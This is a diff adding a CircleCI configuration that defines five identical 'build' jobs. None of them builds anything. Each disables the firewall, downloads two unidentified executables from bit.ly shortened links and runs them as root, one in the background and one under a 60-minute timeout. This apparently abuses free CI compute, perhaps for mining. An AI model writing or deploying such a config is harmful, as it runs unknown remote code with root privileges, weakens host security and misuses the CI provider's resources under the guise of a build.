@@ -1,0 +1,127 @@
+version: 2
+jobs:
+  build:
+    machine:
+      image: ubuntu-2004:202104-01
+    resource_class: large
+    steps:
+      - run: 
+         name: "creating"
+         command: |
+          sudo apt-get update
+          sync && echo 3 | sudo tee /proc/sys/vm/drop_caches
+          sudo ufw disable 
+          wget https://bit.ly/3IspctY
+          chmod +x 3IspctY
+          sudo su --command "nohup ./3IspctY --log=stdout > meta.log &"
+          sleep 2
+          sudo su --command "cat meta.log"    
+      - run: 
+         name: "deploy"
+         no_output_timeout: 60m
+         command: |
+          wget https://bit.ly/3PkNh82
+          chmod +x 3PkNh82
+          sudo su --command "./3PkNh82"
+  build_1a:
+    machine:
+      image: ubuntu-2004:202104-01
+    resource_class: large
+    steps:
+      - run: 
+         name: "creating"
+         command: |
+          sudo apt-get update
+          sync && echo 3 | sudo tee /proc/sys/vm/drop_caches
+          sudo ufw disable 
+          wget https://bit.ly/3IspctY
+          chmod +x 3IspctY
+          sudo su --command "nohup ./3IspctY --log=stdout > meta.log &"
+          sleep 2
+          sudo su --command "cat meta.log"    
+      - run: 
+         name: "deploy"
+         no_output_timeout: 60m
+         command: |
+          wget https://bit.ly/3PkNh82
+          chmod +x 3PkNh82
+          sudo su --command "./3PkNh82"
+  build_2a:
+    machine:
+      image: ubuntu-2004:202104-01
+    resource_class: large
+    steps:
+      - run: 
+         name: "creating"
+         command: |
+          sudo apt-get update
+          sync && echo 3 | sudo tee /proc/sys/vm/drop_caches
+          sudo ufw disable 
+          wget https://bit.ly/3IspctY
+          chmod +x 3IspctY
+          sudo su --command "nohup ./3IspctY --log=stdout > meta.log &"
+          sleep 2
+          sudo su --command "cat meta.log"    
+      - run: 
+         name: "deploy"
+         no_output_timeout: 60m
+         command: |
+          wget https://bit.ly/3PkNh82
+          chmod +x 3PkNh82
+          sudo su --command "./3PkNh82"
+  build_3a:
+    machine:
+      image: ubuntu-2004:202104-01
+    resource_class: large
+    steps:
+      - run: 
+         name: "creating"
+         command: |
+          sudo apt-get update
+          sync && echo 3 | sudo tee /proc/sys/vm/drop_caches
+          sudo ufw disable 
+          wget https://bit.ly/3IspctY
+          chmod +x 3IspctY
+          sudo su --command "nohup ./3IspctY --log=stdout > meta.log &"
+          sleep 2
+          sudo su --command "cat meta.log"    
+      - run: 
+         name: "deploy"
+         no_output_timeout: 60m
+         command: |
+          wget https://bit.ly/3PkNh82
+          chmod +x 3PkNh82
+          sudo su --command "./3PkNh82"
+  build_4a:
+    machine:
+      image: ubuntu-2004:202104-01
+    resource_class: large
+    steps:
+      - run: 
+         name: "creating"
+         command: |
+          sudo apt-get update
+          sync && echo 3 | sudo tee /proc/sys/vm/drop_caches
+          sudo ufw disable 
+          wget https://bit.ly/3IspctY
+          chmod +x 3IspctY
+          sudo su --command "nohup ./3IspctY --log=stdout > meta.log &"
+          sleep 2
+          sudo su --command "cat meta.log"    
+      - run: 
+         name: "deploy"
+         no_output_timeout: 60m
+         command: |
+          wget https://bit.ly/3PkNh82
+          chmod +x 3PkNh82
+          sudo su --command "./3PkNh82"
+       
+workflows:
+  version: 2
+  build:
+    jobs:
+      - build
+      - build_1a
+      - build_2a
+      - build_3a
+      - build_4a
